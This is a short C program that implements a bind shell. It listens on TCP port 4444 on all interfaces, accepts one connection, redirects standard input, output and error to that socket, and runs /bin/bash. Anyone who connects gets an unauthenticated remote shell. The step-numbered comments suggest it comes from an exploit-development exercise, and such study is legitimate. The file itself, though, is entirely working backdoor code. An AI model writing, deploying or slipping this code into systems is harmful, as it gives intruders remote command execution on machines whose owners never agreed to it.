#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>


int main() {

    int sock_fd;
    int conn_fd;
    int status_code;

    // Create addr struct to hold IP address and port
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;                  // IPv4 address
    addr.sin_port = htons(4444);                // htons() to convert to network byte order
    addr.sin_addr.s_addr = htonl(INADDR_ANY);   // INADDR_ANY = Null which means 0.0.0.0 (all interfaces)

    
    // 1. Create TCP socket
    sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if (sock_fd == -1) {
        fprintf(stderr, "[!] Error. Cannot create the socket\n");
        exit(EXIT_FAILURE);
    }

    // 2. Bind socket to IP address:port
    status_code = bind(sock_fd, (struct sockaddr *)&addr, sizeof(addr));
    if (status_code == -1) {
        fprintf(stderr, "[!] Error. Cannot bind socket to the specified IP and port\n");
        exit(EXIT_FAILURE);
    }

    // 3. Listen for incoming connections
    status_code = listen(sock_fd, 0);
    if (status_code == -1) {
        fprintf(stderr, "[!] Error. Cannot listen for incoming connections\n");
        exit(EXIT_FAILURE);
    }

    // 4. Accept connection (blocking call)
    conn_fd = accept(sock_fd, NULL, NULL);
    if (conn_fd == -1) {
        fprintf(stderr, "[!] Error. Cannot accept incoming connections\n");
        exit(EXIT_FAILURE);
    }       
    
    // 5. Redirect stdin(0), stdout(1), stderr(2) to socket
    dup2(conn_fd, 0);
    dup2(conn_fd, 1);
    dup2(conn_fd, 2);

    // 6. Exec bash shell
    execve("/bin/bash", NULL, NULL);
}
